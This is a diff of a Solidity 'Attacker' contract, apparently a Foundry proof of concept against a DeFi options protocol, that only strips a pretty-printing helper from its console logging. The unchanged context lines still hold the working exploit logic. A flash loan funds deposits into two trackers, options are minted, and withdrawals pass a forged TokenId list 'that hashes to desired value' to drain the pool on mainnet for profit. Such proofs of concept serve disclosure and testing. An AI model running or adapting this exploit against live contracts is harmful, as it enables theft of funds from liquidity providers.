@@ -4,7 +4,6 @@ pragma solidity ^0.8.13;
 import "./Interfaces.sol";
 import {TokenId} from "@types/TokenId.sol";
 import {console} from "forge-std/Test.sol";
-import "./Pretty.sol";
 
 // On mainnet
 address constant WETH          = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
@@ -22,7 +21,6 @@ int24 constant MAX_V3POOL_TICK =  887272;
 
 
 contract Attacker is IFlashLoanReceiver {
-    using Pretty for *;
 
     uint256[] fake_token_uints = [
         // fake list of TokenId uints that hashes to desired value
@@ -43,8 +41,8 @@ contract Attacker is IFlashLoanReceiver {
 
         uint256 initialAssets0 = token0.balanceOf(address(this));
         uint256 initialAssets1 = token1.balanceOf(address(this));
-        console.log("<<<< BEFORE ATTACK: initial token 0 balance: ", initialAssets0.pretty(6));
-        console.log("<<<< BEFORE ATTACK: initial token 1 balance: ", initialAssets1.pretty(18));
+        console.log("<<<< BEFORE ATTACK: initial token 0 balance: ", initialAssets0);
+        console.log("<<<< BEFORE ATTACK: initial token 1 balance: ", initialAssets1);
 
         // take flash loan
         (uint256 poolAssets0, , ) = tracker0.getPoolData();
@@ -80,9 +78,9 @@ contract Attacker is IFlashLoanReceiver {
         uint256 ETH_PRICE = 4_200; // 1 ETH = 4_200 USDC
         uint256 finalProfit = finalAssets0 + (finalAssets1 * ETH_PRICE) * 1e6 / 1e18;
 
-        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 0 balance: ", finalAssets0.pretty(6));
-        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 1 balance: ", finalAssets1.pretty(18));
-        console.log("<<<< AFTER PAYING FLASH LOAN: Total profit on Mainnet (in USDC) at 1 ETH = 4_200e18 USDC: %s", finalProfit.pretty(6));
+        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 0 balance: ", finalAssets0);
+        console.log("<<<< AFTER PAYING FLASH LOAN: my final token 1 balance: ", finalAssets1);
+        console.log("<<<< AFTER PAYING FLASH LOAN: Total profit on Mainnet (in USDC) at 1 ETH = 4_200e18 USDC: %s", finalProfit);
         console.log("--------------------------------------------------------");
 
 
@@ -127,8 +125,8 @@ contract Attacker is IFlashLoanReceiver {
         (uint256 poolAssets1, , ) = tracker1.getPoolData();
         {
             console.log("I am contract: ", address(this));
-            console.log("USDC Pool Assets: ", poolAssets0.pretty(6));
-            console.log("WETH Pool Assets: ", poolAssets1.pretty());
+            console.log("USDC Pool Assets: ", poolAssets0);
+            console.log("WETH Pool Assets: ", poolAssets1);
 
             // (, int24 currentTick, , , , , ) = IUniswapV3Pool(uniPool).slot0();
             // console.log("Current tick: ", currentTick);
@@ -155,23 +153,23 @@ contract Attacker is IFlashLoanReceiver {
         uint128 depositAmount1 = attackAmount1 * 120/100;
 
         {
-            console.log("my initial token 0 balance: ", myAssets0.pretty(6));
-            console.log("my initial token 1 balance: ", myAssets1.pretty());
+            console.log("my initial token 0 balance: ", myAssets0);
+            console.log("my initial token 1 balance: ", myAssets1);
 
             console.log("------------------------");
             console.log("Starting attack to draining the pool...");
             console.log("Depositing funds...");
 
             token0.approve(address(tracker0), type(uint104).max);
-            console.log("my initial tracker0 share balance: ", tracker0.balanceOf(address(this)).pretty(3));
+            console.log("my initial tracker0 share balance: ", tracker0.balanceOf(address(this)));
 
             token1.approve(address(tracker1), type(uint104).max);
-            console.log("my initial tracker1 share balance: ", tracker1.balanceOf(address(this)).pretty(3));
+            console.log("my initial tracker1 share balance: ", tracker1.balanceOf(address(this)));
 
             uint myNewShares0 = tracker0.deposit(depositAmount0, address(this));
             uint myNewShares1 = tracker1.deposit(depositAmount1, address(this));
-            console.log("tracker0 share balance from deposit(): ", myNewShares0.pretty(3));
-            console.log("tracker1 share balance from deposit(): ", myNewShares1.pretty(3));
+            console.log("tracker0 share balance from deposit(): ", myNewShares0);
+            console.log("tracker1 share balance from deposit(): ", myNewShares1);
 
             // // ----------- just for reference/debugging -----------
             // int24 spacing = getTickSpacingFromPoolId(poolId);
@@ -212,10 +210,10 @@ contract Attacker is IFlashLoanReceiver {
 
         // value used for calculating fake list
         console.log("minting options with (1 leg) pos0 = ", TokenId.unwrap(pos0));
-        console.log("tracker0 total assets:          ", tracker0.totalAssets().pretty(6));
-        console.log("tracker0 total (shares) supply: ", tracker0.totalSupply().pretty(6));
+        console.log("tracker0 total assets:          ", tracker0.totalAssets());
+        console.log("tracker0 total (shares) supply: ", tracker0.totalSupply());
 
-        console.log("tracker0 my share balance: ", tracker0.balanceOf(address(this)).pretty(3));
+        console.log("tracker0 my share balance: ", tracker0.balanceOf(address(this)));
 
         pp.mintOptions(
             posIdList,          // positionIdList
@@ -246,10 +244,10 @@ contract Attacker is IFlashLoanReceiver {
         posIdList2[1] = pos1;
 
         console.log("minting options with (1 leg) pos1 = ", TokenId.unwrap(pos1));
-        console.log("tracker1 total assets:          ", tracker1.totalAssets().pretty(6));
-        console.log("tracker1 total (shares) supply: ", tracker1.totalSupply().pretty(6));
+        console.log("tracker1 total assets:          ", tracker1.totalAssets());
+        console.log("tracker1 total (shares) supply: ", tracker1.totalSupply());
 
-        console.log("tracker1 my share balance: ", tracker1.balanceOf(address(this)).pretty(3));
+        console.log("tracker1 my share balance: ", tracker1.balanceOf(address(this)));
 
         pp.mintOptions(
             posIdList2,          // positionIdList
@@ -284,8 +282,8 @@ contract Attacker is IFlashLoanReceiver {
         tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);
 
         console.log("------------------------");
-        console.log("my final token 0 balance: ", token0.balanceOf(address(this)).pretty(6));
-        console.log("my final token 1 balance: ", token1.balanceOf(address(this)).pretty());
+        console.log("my final token 0 balance: ", token0.balanceOf(address(this)));
+        console.log("my final token 1 balance: ", token1.balanceOf(address(this)));
         console.log("------------------------");
 
         // now liquidate my own position and repeat...
